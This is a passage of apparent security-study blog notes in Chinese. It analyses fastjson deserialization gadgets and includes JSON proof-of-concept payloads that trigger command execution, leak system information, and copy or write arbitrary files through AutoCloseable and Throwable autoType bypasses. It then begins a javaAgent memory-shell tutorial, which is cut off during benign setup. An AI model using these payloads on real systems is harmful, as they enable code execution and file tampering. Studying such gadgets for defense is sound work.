class="params">(String command)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.command = command;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getMessage</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="keyword">this</span>.command);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">return</span> e.getMessage();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="循环引用"><a href="#循环引用" class="headerlink" title="循环引用"></a>循环引用</h5><p>fastjson支持<a href="https://github.com/alibaba/fastjson/wiki/%E5%BE%AA%E7%8E%AF%E5%BC%95%E7%94%A8">循环引用</a>，并且是缺省打开的。</p>
<p>通过循环引用,我们就可以使用<code>$ref</code>去引用指定对象的某个<code>xxx</code>属性，从而访问该对象的<code>getXXX()</code>方法</p>
<table>
<thead>
<tr>
<th>语法</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>{“$ref”:”$”}</td>
<td>引用根对象</td>
</tr>
<tr>
<td>{“$ref”:”@”}</td>
<td>引用自己</td>
</tr>
<tr>
<td>{“$ref”:”..”}</td>
<td>引用父对象</td>
</tr>
<tr>
<td>{“$ref”:”../..”}</td>
<td>引用父对象的父对象</td>
</tr>
<tr>
<td>{“$ref”:”$.members[0].reportTo”}</td>
<td>基于路径的引用</td>
</tr>
</tbody></table>
<h5 id="poc-1"><a href="#poc-1" class="headerlink" title="poc"></a>poc</h5><p>这个poc本质上可以理解为一个对象里面有两个成员对象x和y</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;x&quot;</span>:</span><br><span class="line">	&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Exception&quot;</span>,</span><br><span class="line">	 <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.test.CalcException&quot;</span>, </span><br><span class="line">	         <span class="attr">&quot;command&quot;</span>:<span class="string">&quot;calc&quot;</span>&#125;, </span><br><span class="line"> <span class="attr">&quot;y&quot;</span>:&#123;<span class="attr">&quot;$ref&quot;</span>:<span class="string">&quot;$x.message&quot;</span>&#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>在fastjson中，在对某个类型反序列化前，先要进行一次<code>ParserConfig#checkAutoType()</code>检查，然后才是获取相应类型的反序列化器进行反序列化。</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220615210559920.png" alt="image-20220615210559920"></p>
<p>在它的反序列化器<code>ThrowableDeserializer</code>里面继续进行词法分析</p>
<p>检测到<code>@type</code>之后,就调用到了<code>expectClass</code>为<code>Throwable.class</code>的<code>checkAutoType方法</code></p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220615210807185.png" alt="image-20220615210807185"></p>
<p>在这次的checkAutoType方法调用中会走到这里,并且返回<code>CalcException.class</code>给<code>exClass</code></p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220615211602310.png" alt="image-20220615211602310"></p>
<p>最后在这里创建这个自定义的异常类,虽然报了一个由于没有toString方法导致的异常,但是并不影响后面setValue</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220615212234939.png" alt="image-20220615212234939"></p>
<p>最终在setValue这里调用set方法实现set方法调用由于循环引用调用到getMessage从而弹出计算器</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220615212151886.png" alt="image-20220615212151886"></p>
<p>虽然Throwable这个点可以利用,但是实际环境中的异常类很少有比较危险的set或者get方法</p>
<h4 id="依赖selenium的信息泄露gadget"><a href="#依赖selenium的信息泄露gadget" class="headerlink" title="依赖selenium的信息泄露gadget"></a>依赖selenium的信息泄露gadget</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.seleniumhq.selenium<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>selenium-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.1.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这个gadget需要目标环境引入selenium依赖</p>
<p>其中，org.openqa.selenium.WebDriverException类的getMessage()方法和getSystemInformation()方法都能获取一些系统信息，比如：IP地址、主机名、系统架构、系统名称、系统版本、JDK版本、selenium webdriver版本。另外，还可通过getStackTrace()来获取函数调用栈，从而获悉使用了什么框架或组件。<br>原理和上面的Throwable一样</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;x&quot;</span>:</span><br><span class="line">  &#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Exception&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;org.openqa.selenium.WebDriverException&quot;</span>&#125;,</span><br><span class="line"> <span class="attr">&quot;y&quot;</span>:&#123;<span class="attr">&quot;$ref&quot;</span>:<span class="string">&quot;$x.systemInformation&quot;</span>&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是<code>getSystemInformation()</code>本身是不回显的</p>
<h3 id="AutoCloseable"><a href="#AutoCloseable" class="headerlink" title="AutoCloseable"></a>AutoCloseable</h3><p>接着来看<code>JavaBeanDeserializer#deserialze()</code>。</p>
<p>原理上，它跟ThrowableDeserializer#deserialze() 这个利用点是一样的，也是通过利用期望类expectClass去绕过<code>checkAutoType()</code>的安全校验。区别在于<code>JavaBeanDeserializer#deserialze()</code>中的expectClass参数是用户可控的，所以漏洞利用可发挥的空间更大。<br>为什么要选择这个接口,其一是因为这个接口和Throwable一样在<code>TypeUtils#mapping</code>中,其二是实现了这个接口的一些类往往和流有关,可能可以操作文件</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220623191250838.png" alt="image-20220623191250838"></p>
<p>fastJson选取构造方法的坑</p>
<p>fastjson在调用<code>JavaBeanDeserializer#deserialze()</code>进行反序列化的过程中，会去寻找目标类的<code>public</code>类型的构造方法：<strong>如果存在无参构造方法，则将其作为构造方法供后续实例化使用；否则使用参数数量最多且排在最前面的构造方法。</strong></p>
<p>根据上面这条规则,使用的是划红线的构造方法,所以在提供参数的时候需要再多提供一个<code>append</code></p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220623202904340.png" alt="image-20220623202904340"></p>
<h5 id="java-io-FileOutputStream"><a href="#java-io-FileOutputStream" class="headerlink" title="java.io.FileOutputStream"></a>java.io.FileOutputStream</h5><p><strong>这个点只能在jdk11+之后才能利用</strong></p>
<p>为什么这个点只能在jdk11之后才能使用?</p>
<p><a href="https://blog.csdn.net/qq_36869808/article/details/123716714">原文地址</a></p>
<p>fastjson 在通过带参构造函数进行<a href="https://so.csdn.net/so/search?q=%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&spm=1001.2101.3001.7020">反序列化</a>时，会检查参数是否有参数名，只有含有参数名的带参构造函数才会被认可。只有当这个类 class 字节码带有调试信息且其中包含有变量信息时才会有。</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220623230704398.png" alt="image-20220623230704398"></p>
<p>使用<code>javap -l java.io.FileOutputStream</code>显示出行号和本地变量表</p>
<p>分别使用jdk11和jdk1.8执行</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220623230339199.png" alt="image-20220623230339199"></p>
<p>可以明显看出,jdk11的字节码存储了参数的名字,而jdk8只会使用var0,var1这样的符号来表示,也就是说fastjson读取不到参数名</p>
<p>这一点也可以在查看.calss文件的时候体现出来,jdk11的字节码中变量不是使用var0这样的东西来替代的,用得是自己本来的名字</p>
<blockquote>
<p>LocalVariableTable该属性的作用是描述帧栈中局部变量与源码中定义的变量之间的关系。可以使用 -g:none 或<br>-g:vars来取消或生成这项信息，如果没有生成这项信息，那么当别人引用这个方法时，将无法获取到参数名称，取而代之的是arg0, arg1这样的占位符。start<br>表示该局部变量在哪一行开始可见，length表示可见行数，Slot代表所在帧栈位置，Name是变量名称，然后是类型签名。</p>
</blockquote>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line"><span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.io.FileOutputStream&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;file&quot;</span>: <span class="string">&quot;C:/temp/test2.txt&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;append&quot;</span>: <span class="string">&quot;false&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="gadget1-复制文件"><a href="#gadget1-复制文件" class="headerlink" title="gadget1 复制文件"></a>gadget1 复制文件</h5><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.aspectj<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>aspectjtools<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.9.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这个依赖中有一个类<code>org.eclipse.core.internal.localstore.SafeFileOutputStream</code></p>
<p>它的构造方法当<code>targetPath</code>不存在且<code>tempPath</code>存在时，便会进行文件复制</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220623235104501.png" alt="image-20220623235104501"></p>
<p>poc</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;</span>,</span><br><span class="line">    <span class="string">&quot;targetPath&quot;</span>:<span class="string">&quot;C:/temp/test2.txt&quot;</span>,</span><br><span class="line">    <span class="string">&quot;tempPath&quot;</span>:<span class="string">&quot;C:/windows/setupact.log&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="gadget2-写文件"><a href="#gadget2-写文件" class="headerlink" title="gadget2 写文件"></a>gadget2 写文件</h5><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.aspectj<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>aspectjtools<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.9.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.esotericsoftware<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>kryo<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.sleepycat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>je<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">version</span>&gt;</span>18.3.12<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>poc</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#x27;stream&#x27;:</span><br><span class="line">    &#123;</span><br><span class="line">        &#x27;@type&#x27;:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">        &#x27;@type&#x27;:&#x27;org.eclipse.core.internal.localstore.SafeFileOutputStream&#x27;,</span><br><span class="line">        &#x27;targetPath&#x27;:&#x27;/tmp/dst&#x27;,</span><br><span class="line">        &#x27;tempPath&#x27;:&#x27;/tmp/src&#x27;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#x27;writer&#x27;:</span><br><span class="line">    &#123;</span><br><span class="line">        &#x27;@type&#x27;:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">        &#x27;@type&#x27;:&#x27;com.esotericsoftware.kryo.io.Output&#x27;,</span><br><span class="line">        &#x27;buffer&#x27;:&#x27;aGFja2VkIGJ5IG0wMWUu&#x27;,</span><br><span class="line">        &#x27;outputStream&#x27;:</span><br><span class="line">        &#123;</span><br><span class="line">            &#x27;$ref&#x27;:&#x27;$.stream&#x27;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#x27;position&#x27;:<span class="number">15</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#x27;close&#x27;:</span><br><span class="line">    &#123;</span><br><span class="line">        &#x27;@type&#x27;:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">        &#x27;@type&#x27;:&#x27;com.sleepycat.bind.serial.SerialOutput&#x27;,</span><br><span class="line">        &#x27;out&#x27;:</span><br><span class="line">        &#123;</span><br><span class="line">            &#x27;$ref&#x27;:&#x27;$.writer&#x27;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>总体来说是一个循环引用的嵌套</p>
<p>(1) 首先通过<code>org.eclipse.core.internal.localstore.SafeFileOutputStream</code>的构造方法创建一个输出流对象，并通过参数去指定目标路径/tmp/dst;<br>(2) 然后通过<code>com.esotericsoftware.kryo.io.Output</code>的无参构造方法创建输出流对象，并通过setter方法将自身的输出流指向SafeFileOutputStream输出流对象，且通过setter方法往自身缓冲区填充要写入的数据；<br>(3) 最后，再通过<code>com.sleepycat.bind.serial.SerialOutput</code>的构造方法创建输出流对象，并通过参数将输出流指向(2)创建的Output对象；同时在<code>com.sleepycat.bind.serial.SerialOutput</code>构造方法调用的过程中，会调用<code>com.esotericsoftware.kryo.io.Output#flush()</code>方法，将buffer缓冲区的数据写入到目标文件/tmp/dst。</p>
<h5 id="gadget3-写文件-jdk"><a href="#gadget3-写文件-jdk" class="headerlink" title="gadget3 写文件(jdk)"></a>gadget3 写文件(jdk)</h5><p>这是 @rmb122发现的一个仅依赖于JDK的写文件gadget，尽管如此，前面也提到了，成功与否取决于目标程序的JDK是否带调试信息。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#x27;@type&#x27;:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">    &#x27;@type&#x27;:&#x27;sun.rmi.server.MarshalOutputStream&#x27;,</span><br><span class="line">    &#x27;out&#x27;:</span><br><span class="line">    &#123;</span><br><span class="line">        &#x27;@type&#x27;:&#x27;java.util.zip.InflaterOutputStream&#x27;,</span><br><span class="line">        &#x27;out&#x27;:</span><br><span class="line">        &#123;</span><br><span class="line">           &#x27;@type&#x27;:&#x27;java.io.FileOutputStream&#x27;,</span><br><span class="line">           &#x27;file&#x27;:&#x27;C:/temp/test.txt&#x27;,</span><br><span class="line">           &#x27;append&#x27;:<span class="literal">false</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#x27;infl&#x27;:</span><br><span class="line">        &#123;</span><br><span class="line">            &#x27;@type&#x27;:&#x27;java.util.zip.Inflater&#x27;</span><br><span class="line">            &#x27;input&#x27;:</span><br><span class="line">            &#123;</span><br><span class="line">                &#x27;array&#x27;:&#x27;eNoLz0gsKS4uLVBIL60s1lEoycgsVgCiXAPDVD0FT/VchYzUolSFknyF8sSSzLx0hbT8IoVQhbz8cj0uAGcUE78=&#x27;,</span><br><span class="line">                &#x27;limit&#x27;:<span class="number">65</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#x27;bufLen&#x27;:<span class="number">1048576</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#x27;protocolVersion&#x27;:<span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>后面加不加@type都可以写文件,这个点值得研究一下</p>
<h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>在学习代码审计的过程中,由于有的使用了fastjson组件从而接触到了fastjson反序列化漏洞,所以根据网络上的文章,大体将每个版本漏洞的产生原理跟着学习了一下,由于水平不足,不能做出一些延伸和思考,后序内容再补</p>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>fastjson</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>javaAgent内存马</title>
    <url>/2022/04/25/javaAgent%E5%86%85%E5%AD%98%E9%A9%AC/</url>
    <content><![CDATA[<p>在jdk1.5以后,javaAgent是一种能够在不影响正常编译的情况下,修改字节码的技术</p>
<p>java作为一种强类型语言,不通过编译就不能够进行jar包的生成,而有了javaAgent技术,就可以在字节码这个层面对类和方法进行修改,同时,也可以把javaAgent理解成一种代码注入的方式,但是这种注入比起spring的aop更加优美</p>
<p>java agent使用方式</p>
<p>实现<code>premain</code>方法在JVM启动前加载</p>
<p>从字面上理解,就是运行在main函数之前的类,当java虚拟机启动时,在执行main函数之前,JVM会先运行javaAgent所指定jar包内Premain-Class这个类的premain方法</p>
<p>实现<code>agentmain</code>在JVM启动后加载</p>
<p>主要的接口代码在rt.jar java.lang.instrument包下面</p>
<p>实现代码在</p>
<p>JVM会优先加载带<code>Instrumentation</code>签名的方法,加载成功则忽略不带签名的,如果没有带签名的,则加载不带签名的,这个逻辑在<code>InstrumentationImpl</code>中</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220425142219666.png" alt="image-20220425142219666"></p>
<p>Instrumentation接口定义</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Instrumentation</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//增加一个Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">addTransformer</span><span class="params">(ClassFileTransformer transformer, <span class="keyword">boolean</span> canRetransform)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//在类加载之前，重新定义 Class 文件，ClassDefinition 表示对一个类新的定义，如果在类加载之后，需要使用 retransformClasses 方法重新定义。addTransformer方法配置之后，后续的类加载都会被Transformer拦截。对于已经加载过的类，可以执行retransformClasses来重新触发这个Transformer的拦截。类加载的字节码被修改后，除非再次被retransform，否则不会恢复。</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">addTransformer</span><span class="params">(ClassFileTransformer transformer)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//删除一个类转换器</span></span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">removeTransformer</span><span class="params">(ClassFileTransformer transformer)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">isRetransformClassesSupported</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//在类加载之后，重新定义 Class。这个很重要，该方法是1.6 之后加入的，事实上，该方法是 update 了一个类。</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">retransformClasses</span><span class="params">(Class&lt;?&gt;... classes)</span> <span class="keyword">throws</span> UnmodifiableClassException</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">isRedefineClassesSupported</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">redefineClasses</span><span class="params">(ClassDefinition... definitions)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span>  ClassNotFoundException, UnmodifiableClassException</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">isModifiableClass</span><span class="params">(Class&lt;?&gt; theClass)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;rawtypes&quot;)</span></span><br><span class="line">    Class[] getAllLoadedClasses();</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;rawtypes&quot;)</span></span><br><span class="line">    Class[] getInitiatedClasses(ClassLoader loader);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取一个对象的大小</span></span><br><span class="line">    <span class="function"><span class="keyword">long</span> <span class="title">getObjectSize</span><span class="params">(Object objectToSize)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">appendToBootstrapClassLoaderSearch</span><span class="params">(JarFile jarfile)</span></span>;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">appendToSystemClassLoaderSearch</span><span class="params">(JarFile jarfile)</span></span>;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">isNativeMethodPrefixSupported</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">setNativeMethodPrefix</span><span class="params">(ClassFileTransformer transformer, String prefix)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>如何实现一个javaAgent</p>
<p>使用javaAgent需要几个步骤</p>
<p>1.定义一个MANIFEST.MF文件,必须包含Premain-Class选型,通常也会加入Can-Redefine-Classes和Can-Retransform-Classes选项</p>
<p>2.创建一个Premain-Class指定的类,类中包含premain方法,方法逻辑由用户自定确定</p>
<p>3.将premain的类和MANIFEST.MF文件打包成jar包</p>
<p>4.使用参数 -javaagent:jar包路径 启动要代理的方法</p>
<p>在执行以上步骤后,JVM会先执行premain方法,大部分类加载都会通过该方法,注意:是大部分,不是所有.当然,遗漏的主要是系统类,因为很多系统类先于agent执行,而用户类的加载肯东是会被拦截的.也就是说,这个方法是在main方法启动前拦截大部分类的加载活动,既然可以拦截类的加载,那么久可以去做重写类这样的操作,结合第三方的字节码编译工具,比如ASM,javassist,cglib,bytebubby等等来改写实现类</p>
<h4 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h4><p>实现javaagent需要搭建两个工程,一个工程师用来承载javaagent类,单独的打成jar包;</p>
<p>一个工程师javaagent需要去代理的类,即javaagent会在这个工程中的main方法启动之前去做一些事情</p>
<h4 id="premain简单实现"><a href="#premain简单实现" class="headerlink" title="premain简单实现"></a>premain简单实现</h4><p>1.新建项目</p>
<p>项目结构如图</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220426090315058.png" alt="image-20220426090315058"></p>
<p>没有建立包的原因是为了后面命令行执行的时候方便操作</p>
<p>mainTest文件</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;main方法执行!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>AgentTest文件(内部实现premain方法)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AgentTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">premain</span><span class="params">(String args, Instrumentation instrumentation)</span><span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;premain agent!!!!&quot;</span>);</span><br><span class="line">        System.out.println(args);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Manifest-Version: <span class="number">1.0</span></span><br><span class="line">Can-Redefine-Classes: <span class="keyword">true</span></span><br><span class="line">Can-Retransform-Classes: <span class="keyword">true</span></span><br><span class="line">Premain-Class: AgentTest</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>将项目以Artifacts模式打包为jar包,(其实主要打包的是premain的类)</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220426090634611.png" alt="image-20220426090634611"></p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220426092321902.png" alt="image-20220426092321902"></p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220426092334442.png" alt="image-20220426092334442"></p>
<p>打包为jar包在out目录下</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220426092359077.png" alt="image-20220426092359077"></p>
<p>这个时候不写包名的作用就体现出来了,将刚才打包的jar和javaagent作为参数去运行MainTest</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -javaagent:E:\java\rubbish\test1\out\artifacts\test1_jar\test1.jar MainTest</span><br></pre></td></tr></table></figure>

<p>虽然成功执行了,但是乱码了,很烦</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220426093144597.png" alt="image-20220426093144597"></p>
<p>premain的这种方式需要在启动时用<code>-javaagent</code>参数绑定,存在一定的局限性,在实际环境中,目标的JVM通常是已经启动的状态,无法预先加载premain,相比之下,agentmain更加实用</p>
<h3 id="agentmain"><a href="#agentmain" class="headerlink" title="agentmain"></a>agentmain</h3><p>不知道为什么,tools.jar是添加到环境变量中的,但是<code>com.sun.tools.attach</code>还是报红</p>
<p>直接导入外部依赖将tools.jar的真实路径填写,就不报红了</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.sun<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tools<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.8.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">scope</span>&gt;</span>system<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">systemPath</span>&gt;</span>D:\environment\jdks\jdk1.8.0_65\lib\tools.jar<span class="tag">&lt;/<span class="name">systemPath</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>写一个<code>agentmain</code>和<code>premain</code>差不多,只需要在<code>META-INF/MANIFEST.MF</code>中加入<code>Agent-Class:</code>即可</p>
<p>不同的是,这种方法不是通过JVM启动前的参数来指定的,官方为了实现启动后加载,提供了<code>Attach API</code>,<code>Attach API</code>很简单,只有2个主要的类,都在<code>com.sun.tools.attach</code>包里面</p>
<p>主要关注抽象类<code>VirtualMachine</code></p>
<p>字面意思就是虚拟机,也就是程序需要监控的目标虚拟机,提供了获取系统信息,它里面提供了获取系统信息、 <code>loadAgent</code>，<code>Attach</code> 和 <code>Detach</code> 等方法</p>
